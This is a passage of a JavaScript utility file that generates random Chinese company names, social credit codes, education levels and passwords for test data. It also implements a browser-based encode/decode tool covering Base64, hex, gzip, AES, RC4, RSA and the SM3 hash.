        // 传统行业
        '建筑', '机械', '化工', '医药', '食品', '纺织', '服装', '家居', '家电', '汽车',
        '能源', '矿产', '农业', '林业', '畜牧', '渔业', '物流', '运输', '仓储', '贸易',
        // 服务业
        '教育', '培训', '咨询', '金融', '保险', '证券', '投资', '旅游', '餐饮', '酒店',
        '文化', '传媒', '广告', '设计', '法律', '会计', '医疗', '健康', '养老', '环保'
    ];
    
    // 更全面的公司后缀
    const suffixes = [
        '有限公司', '股份有限公司', '集团有限公司', '科技有限公司', '信息技术有限公司', 
        '网络科技有限公司', '软件有限公司', '电子科技有限公司', '通信技术有限公司', 
        '数据服务有限公司', '智能科技有限公司', '数字技术有限公司', '互联网科技有限公司',
        '实业有限公司', '投资有限公司', '贸易有限公司', '商贸有限公司', '工贸有限公司',
        '服务有限公司', '咨询有限公司', '管理有限公司', '文化传播有限公司', '传媒有限公司',
        '教育科技有限公司', '医疗科技有限公司', '生物科技有限公司', '环保科技有限公司'
    ];
    
    // 随机决定是否添加中间词
    const useMiddleWord = Math.random() > 0.5;
    
    // 中间词列表
    const middleWords = ['恒', '鑫', '盛', '泰', '宏', '源', '兴', '瑞', '金', '银', '铭', '达', '丰', '华', '亿', '博', '腾', '嘉', '信', '通'];
    
    // 随机选择前缀、类型和后缀
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    const type = types[Math.floor(Math.random() * types.length)];
    const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
    
    // 如果使用中间词，则随机选择一个
    if (useMiddleWord) {
        const middleWord = middleWords[Math.floor(Math.random() * middleWords.length)];
        return `${prefix}${middleWord}${type}${suffix}`;
    } else {
        return `${prefix}${type}${suffix}`;
    }
}

// 随机统一社会信用代码生成函数
function generateRandomCreditCode() {
    // 统一社会信用代码规则：
    // 第1位：登记管理部门代码（1位字母）
    // 第2位：机构类别代码（1位数字）
    // 第3-8位：登记管理机关行政区划码（6位数字）
    // 第9-17位：主体标识码（组织机构代码，9位字符）
    // 第18位：校验码（1位字符）
    
    // 登记管理部门代码（第1位）
    const regDeptCodes = ['1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'N', 'Y'];
    // 1-工商, 2-机构编制, 3-民政, 4-司法, 5-税务, 6-文化, 7-宗教, 8-农业, 9-其他, A-中央军委, N-外国机构, Y-其他
    
    // 机构类别代码（第2位）
    const orgTypeCodes = ['1', '2', '3', '9'];
    // 1-企业, 2-个体工商户, 3-农民专业合作社, 9-其他
    
    // 行政区划码（第3-8位）- 使用实际的省市区代码前6位
    const areaCodes = [
        '110000', '120000', '130000', '140000', '150000', '210000', '220000', '230000',
        '310000', '320000', '330000', '340000', '350000', '360000', '370000', '410000',
        '420000', '430000', '440000', '450000', '460000', '500000', '510000', '520000',
        '530000', '540000', '610000', '620000', '630000', '640000', '650000'
    ];
    
    // 主体标识码（第9-17位）- 组织机构代码
    const chars = '0123456789ABCDEFGHJKLMNPQRTUWXY';
    
    // 生成第1位：登记管理部门代码
    let code = regDeptCodes[Math.floor(Math.random() * regDeptCodes.length)];
    
    // 生成第2位：机构类别代码
    code += orgTypeCodes[Math.floor(Math.random() * orgTypeCodes.length)];
    
    // 生成第3-8位：行政区划码
    const areaCode = areaCodes[Math.floor(Math.random() * areaCodes.length)];
    code += areaCode;
    
    // 生成第9-17位：主体标识码（组织机构代码）
    let orgCode = '';
    for (let i = 0; i < 8; i++) {
        orgCode += chars[Math.floor(Math.random() * chars.length)];
    }
    
    // 计算组织机构代码的校验位（第17位）
    const weights = [3, 7, 9, 10, 5, 8, 4, 2];
    let sum = 0;
    for (let i = 0; i < 8; i++) {
        const charValue = chars.indexOf(orgCode[i]);
        sum += charValue * weights[i];
    }
    const orgCheckCode = chars[31 - (sum % 31)];
    
    // 添加组织机构代码（含校验位）
    code += orgCode + orgCheckCode;
    
    // 计算统一社会信用代码的校验位（第18位）
    const fullWeights = [1, 3, 9, 27, 19, 26, 16, 17, 20, 29, 25, 13, 8, 24, 10, 30, 28];
    sum = 0;
    for (let i = 0; i < 17; i++) {
        const charValue = chars.indexOf(code[i]);
        sum += charValue * fullWeights[i];
    }
    const checkCode = chars[31 - (sum % 31)];
    
    // 添加校验位
    code += checkCode;
    
    return code;
}

// 随机文化程度生成函数
function generateRandomEducation() {
    const educations = [
        '小学',
        '初中',
        '高中',
        '中专',
        '大专',
        '本科',
        '硕士',
        '博士',
        '博士后'
    ];
    
    return educations[Math.floor(Math.random() * educations.length)];
}

// 随机密码生成函数
function generateRandomPassword() {
    const length = 12; // 密码长度
    const chars = {
        uppercase: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
        lowercase: 'abcdefghijklmnopqrstuvwxyz',
        numbers: '0123456789',
        symbols: '!@#$%^&*()_+-=[]{}|;:,.<>?'
    };
    
    let password = '';
    
    // 确保每种字符至少出现一次
    password += chars.uppercase[Math.floor(Math.random() * chars.uppercase.length)];
    password += chars.lowercase[Math.floor(Math.random() * chars.lowercase.length)];
    password += chars.numbers[Math.floor(Math.random() * chars.numbers.length)];
    password += chars.symbols[Math.floor(Math.random() * chars.symbols.length)];
    
    // 填充剩余长度
    const allChars = chars.uppercase + chars.lowercase + chars.numbers + chars.symbols;
    for (let i = password.length; i < length; i++) {
        password += allChars[Math.floor(Math.random() * allChars.length)];
    }
    
    // 打乱密码字符顺序
    return password.split('').sort(() => Math.random() - 0.5).join('');
}

function initDecoderTool() {
    const input = document.getElementById('decoderInput');
    const output = document.getElementById('decoderOutput');
    const action = document.getElementById('decoderAction');
    const algorithm = document.getElementById('decoderAlgorithm');
    const cryptoOptions = document.getElementById('decoderCryptoOptions');
    const runButton = document.getElementById('decoderRunButton');
    const swapButton = document.getElementById('decoderSwapButton');
    const clearButton = document.getElementById('decoderClearButton');

    if (!input || !output || !action || !algorithm || !runButton) return;

    const cryptoAlgorithms = new Set(['aes', 'des', 'sm2', 'sm3', 'sm4', 'rc4', 'rsa']);
    const toggleCryptoOptions = () => {
        if (cryptoOptions) cryptoOptions.classList.toggle('active', cryptoAlgorithms.has(algorithm.value));
    };

    algorithm.addEventListener('change', toggleCryptoOptions);
    toggleCryptoOptions();

    runButton.addEventListener('click', async () => {
        output.textContent = '处理中...';
        try {
            output.textContent = await runDecoderAction(input.value, action.value, algorithm.value);
        } catch (err) {
            output.textContent = `错误: ${err.message || err}`;
        }
    });

    swapButton.addEventListener('click', () => {
        input.value = output.textContent || '';
    });

    if (clearButton) {
        clearButton.addEventListener('click', () => {
            input.value = '';
            output.textContent = '';
        });
    }
}

async function runDecoderAction(value, action, algorithm) {
    const isDecode = action === 'decode';
    const text = getDecoderText(value);

    switch (algorithm) {
        case 'plain':
            return text;
        case 'url':
            return isDecode ? decodeURIComponent(text.replace(/\+/g, ' ')) : encodeURIComponent(text);
        case 'html':
            return isDecode ? decodeHtmlEntities(text) : encodeHtmlEntities(text);
        case 'base64':
            return isDecode ? bytesToUtf8(base64ToBytes(text)) : bytesToBase64(utf8ToBytes(text));
        case 'asciiHex':
        case 'hex':
            return isDecode ? bytesToUtf8(hexToBytes(text)) : bytesToHex(utf8ToBytes(text));
        case 'octal':
            return isDecode ? bytesToUtf8(text.trim().split(/\s+/).filter(Boolean).map(v => parseInt(v, 8))) : Array.from(utf8ToBytes(text)).map(b => b.toString(8).padStart(3, '0')).join(' ');
        case 'binary':
            return isDecode ? bytesToUtf8(text.trim().split(/\s+/).filter(Boolean).map(v => parseInt(v, 2))) : Array.from(utf8ToBytes(text)).map(b => b.toString(2).padStart(8, '0')).join(' ');
        case 'gzip':
            return isDecode ? bytesToUtf8(await gzipDecode(base64ToBytes(text))) : bytesToBase64(await gzipEncode(utf8ToBytes(text)));
        case 'aes':
            return runAes(text, isDecode);
        case 'rc4':
            return runRc4(text, isDecode);
        case 'rsa':
            return runRsa(text, isDecode);
        case 'sm3':
            if (isDecode) throw new Error('SM3 是哈希算法，不能解码；请选择 Encode as 计算摘要');
            return bytesToHex(sm3Hash(utf8ToBytes(text)));
        case 'des':
            throw new Error('当前浏览器原生 WebCrypto 不支持 DES；已保留 DES 入口，需引入本地 DES 实现后启用');
        case 'sm2':
            throw new Error('SM2 需要专用国密实现和密钥格式解析；已保留 SM2 入口，需引入本地 SM2 实现后启用');
        case 'sm4':
            throw new Error('SM4 需要专用国密分组密码实现；已保留 SM4 入口，需引入本地 SM4 实现后启用');
        default:
            throw new Error('未知方式');
    }
}

function getDecoderText(value) {
    const mode = document.querySelector('input[name="decoderInputMode"]:checked');
    if (mode && mode.value === 'hex') {
        return bytesToUtf8(hexToBytes(value));
    }
    return value;
}

function utf8ToBytes(text) {
    return new TextEncoder().encode(text);
}

function bytesToUtf8(bytes) {
    return new TextDecoder().decode(new Uint8Array(bytes));
}

function bytesToHex(bytes) {
    return Array.from(bytes).map(b => (b & 255).toString(16).padStart(2, '0')).join('');
}

function hexToBytes(hex) {
    const clean = hex.replace(/[^0-9a-fA-F]/g, '');
    if (clean.length % 2) throw new Error('Hex 长度必须是偶数');
    const out = new Uint8Array(clean.length / 2);
    for (let i = 0; i < clean.length; i += 2) out[i / 2] = parseInt(clean.slice(i, i + 2), 16);
    return out;
}

function bytesToBase64(bytes) {
    let bin = '';
    new Uint8Array(bytes).forEach(b => bin += String.fromCharCode(b));
    return btoa(bin);
}

function base64ToBytes(base64) {
    const bin = atob(base64.replace(/\s+/g, ''));
    const out = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
}

function encodeHtmlEntities(text) {
    return text.replace(/[&<>"']/g, ch => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
    }[ch]));
}

function decodeHtmlEntities(text) {
    const textarea = document.createElement('textarea');
    textarea.innerHTML = text;
    return textarea.value;
}

async function gzipEncode(bytes) {
    if (typeof CompressionStream === 'undefined') throw new Error('当前浏览器不支持 CompressionStream');
    const stream = new Blob([bytes]).stream().pipeThrough(new CompressionStream('gzip'));
    return new Uint8Array(await new Response(stream).arrayBuffer());
}

async function gzipDecode(bytes) {
    if (typeof DecompressionStream === 'undefined') throw new Error('当前浏览器不支持 DecompressionStream');
    const stream = new Blob([bytes]).stream().pipeThrough(new DecompressionStream('gzip'));
    return new Uint8Array(await new Response(stream).arrayBuffer());
}

function getDecoderFormat() {
    const el = document.getElementById('decoderInputFormat');
    return el ? el.value : 'base64';
}

function getDecoderKey() {
    const el = document.getElementById('decoderKey');
    return el ? el.value : '';
}

function getDecoderIv(length) {
    const el = document.getElementById('decoderIv');
    const raw = el ? el.value.trim() : '';
    if (!raw) return new Uint8Array(length);
    if (/^[0-9a-fA-F\s]+$/.test(raw) && raw.replace(/\s+/g, '').length % 2 === 0) {
        const bytes = hexToBytes(raw);
        if (bytes.length === length) return bytes;
    }
    const bytes = utf8ToBytes(raw);
    if (bytes.length !== length) throw new Error(`IV 长度必须是 ${length} 字节`);
    return bytes;
}

function formatToBytes(text) {
    const format = getDecoderFormat();
    if (format === 'hex') return hexToBytes(text);
    if (format === 'base64') return base64ToBytes(text);
    return utf8ToBytes(text);
}

function bytesToSelectedFormat(bytes) {
    const format = getDecoderFormat();
    if (format === 'hex') return bytesToHex(bytes);
    if (format === 'base64') return bytesToBase64(bytes);
    return bytesToUtf8(bytes);
}

async function runAes(text, isDecode) {
    const keyBytes = normalizeAesKey(getDecoderKey());
    const modeEl = document.getElementById('decoderCipherMode');
    const mode = modeEl ? modeEl.value : 'cbc';
    if (mode === 'ecb') throw new Error('WebCrypto 不支持 AES-ECB，请选择 CBC 或 GCM');

    const name = mode === 'gcm' ? 'AES-GCM' : 'AES-CBC';
    const iv = getDecoderIv(mode === 'gcm' ? 12 : 16);
    const key = await crypto.subtle.importKey('raw', keyBytes, { name }, false, [isDecode ? 'decrypt' : 'encrypt']);
    const inputBytes = isDecode ? formatToBytes(text) : utf8ToBytes(text);
    const result = await crypto.subtle[isDecode ? 'decrypt' : 'encrypt']({ name, iv }, key, inputBytes);
    return isDecode ? bytesToUtf8(new Uint8Array(result)) : bytesToSelectedFormat(new Uint8Array(result));
}

function normalizeAesKey(keyText) {
    if (!keyText) throw new Error('AES 需要 Key');
    let bytes = /^[0-9a-fA-F\s]+$/.test(keyText) && keyText.replace(/\s+/g, '').length % 2 === 0 ? hexToBytes(keyText) : utf8ToBytes(keyText);
    if (![16, 24, 32].includes(bytes.length)) {
        const fixed = new Uint8Array(bytes.length <= 16 ? 16 : bytes.length <= 24 ? 24 : 32);
        fixed.set(bytes.slice(0, fixed.length));
        bytes = fixed;
    }
    return bytes;
}

function runRc4(text, isDecode) {
    const key = utf8ToBytes(getDecoderKey());
    if (!key.length) throw new Error('RC4 需要 Key');
    const data = isDecode ? formatToBytes(text) : utf8ToBytes(text);
    const out = rc4Bytes(key, data);
    return isDecode ? bytesToUtf8(out) : bytesToSelectedFormat(out);
}

function rc4Bytes(key, data) {
    const s = new Uint8Array(256);
    for (let i = 0; i < 256; i++) s[i] = i;
    let j = 0;
    for (let i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % key.length]) & 255;
        [s[i], s[j]] = [s[j], s[i]];
    }
    const out = new Uint8Array(data.length);
    let i = 0;
    j = 0;
    for (let n = 0; n < data.length; n++) {
        i = (i + 1) & 255;
        j = (j + s[i]) & 255;
        [s[i], s[j]] = [s[j], s[i]];
        out[n] = data[n] ^ s[(s[i] + s[j]) & 255];
    }
    return out;
}

async function runRsa(text, isDecode) {
    const pem = getDecoderKey().trim();
    if (!pem) throw new Error(isDecode ? 'RSA 解密需要私钥 PEM' : 'RSA 加密需要公钥 PEM');
    const usage = isDecode ? 'decrypt' : 'encrypt';
    const format = isDecode ? 'pkcs8' : 'spki';
    const keyData = pemToArrayBuffer(pem);
    const key = await crypto.subtle.importKey(format, keyData, { name: 'RSA-OAEP', hash: 'SHA-256' }, false, [usage]);
    const inputBytes = isDecode ? formatToBytes(text) : utf8ToBytes(text);
    const result = await crypto.subtle[usage]({ name: 'RSA-OAEP' }, key, inputBytes);
    return isDecode ? bytesToUtf8(new Uint8Array(result)) : bytesToSelectedFormat(new Uint8Array(result));
}

function pemToArrayBuffer(pem) {
    const base64 = pem.replace(/-----BEGIN [^-]+-----/g, '').replace(/-----END [^-]+-----/g, '').replace(/\s+/g, '');
    return base64ToBytes(base64).buffer;
}

function sm3Hash(message) {
    const rotl = (x, n) => ((x << n) | (x >>> (32 - n))) >>> 0;
    const p0 = x => (x ^ rotl(x, 9) ^ rotl(x, 17)) >>> 0;
    const p1 = x => (x ^ rotl(x, 15) ^ rotl(x, 23)) >>> 0;
    const ff = (x, y, z, j) => (j < 16 ? (x ^ y ^ z) : ((x & y) | (x & z) | (y & z))) >>> 0;
    const gg = (x, y, z, j) => (j < 16 ? (x ^ y ^ z) : ((x & y) | (~x & z))) >>> 0;
    const iv = [0x7380166f, 0x4914b2b9, 0x172442d7, 0xda8a0600, 0xa96f30bc, 0x163138aa, 0xe38dee4d, 0xb0fb0e4e];
    const msg = Array.from(message);
    const bitLen = msg.length * 8;
    msg.push(0x80);
    while ((msg.length % 64) !== 56) msg.push(0);
    for (let i = 7; i >= 0; i--) msg.push((bitLen / Math.pow(2, i * 8)) & 255);

    let v = iv.slice();
    for (let offset = 0; offset < msg.length; offset += 64) {
        const w = new Array(68);
        const wp = new Array(64);
        for (let i = 0; i < 16; i++) {
            w[i] = ((msg[offset + i * 4] << 24) | (msg[offset + i * 4 + 1] << 16) | (msg[offset + i * 4 + 2] << 8) | msg[offset + i * 4 + 3]) >>> 0;
        }
        for (let i = 16; i < 68; i++) w[i] = (p1(w[i - 16] ^ w[i - 9] ^ rotl(w[i - 3], 15)) ^ rotl(w[i - 13], 7) ^ w[i - 6]) >>> 0;
        for (let i = 0; i < 64; i++) wp[i] = (w[i] ^ w[i + 4]) >>> 0;
        let [a, b, c, d, e, f, g, h] = v;
        for (let j = 0; j < 64; j++) {
            const tj = j < 16 ? 0x79cc4519 : 0x7a879d8a;
            const ss1 = rotl((((rotl(a, 12) + e) >>> 0) + rotl(tj, j % 32)) >>> 0, 7);
            const ss2 = (ss1 ^ rotl(a, 12)) >>> 0;
            const tt1 = (ff(a, b, c, j) + d + ss2 + wp[j]) >>> 0;
            const tt2 = (gg(e, f, g, j) + h + ss1 + w[j]) >>> 0;
            d = c; c = rotl(b, 9); b = a; a = tt1;
            h = g; g = rotl(f, 19); f = e; e = p0(tt2);
        }
        v = [a ^ v[0], b ^ v[1], c ^ v[2], d ^ v[3], e ^ v[4], f ^ v[5], g ^ v[6], h ^ v[7]].map(x => x >>> 0);
    }
    const out = new Uint8Array(32);
    v.forEach((word, i) => {
        out[i * 4] = word >>> 24;
        out[i * 4 + 1] = word >>> 16;
        out[i * 4 + 2] = word >>> 8;
        out[i * 4 + 3] = word;
    });
    return out;
}
